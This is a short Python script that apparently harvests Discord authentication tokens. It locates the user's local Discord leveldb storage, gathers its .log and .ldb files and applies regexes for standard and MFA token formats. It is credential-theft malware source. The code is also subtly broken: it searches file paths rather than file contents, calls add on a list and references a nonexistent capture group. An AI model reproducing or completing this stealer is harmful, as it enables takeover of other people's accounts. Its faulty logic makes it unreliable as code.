import os
import re
import sys

ldbsAndLogs = []
tokens = []

localUsername = os.getlogin()
levelDbPath = "C:\\Users\\"+localUsername+"\\AppData\\Roaming\\discord\\Local Storage\\leveldb"
for f in os.listdir(levelDbPath):
    if os.path.isfile(os.path.join(levelDbPath, f)):
        filename,filetype = os.path.splitext(os.path.join(levelDbPath, f))
        if filetype == ".log" or filetype == ".ldb":
            ldbsAndLogs.append(os.path.join(levelDbPath, f))

for loc in ldbsAndLogs:
    search = re.search("[\w-]{24}\.[\w-]{6}\.[\w-]{27}",loc)
    if search != None:
        tokens.add(search.group(1))
    search2 = re.search("mfa\.[\w-]{84}",loc)
    if search2 != None:
        tokens.add(search.group(1))
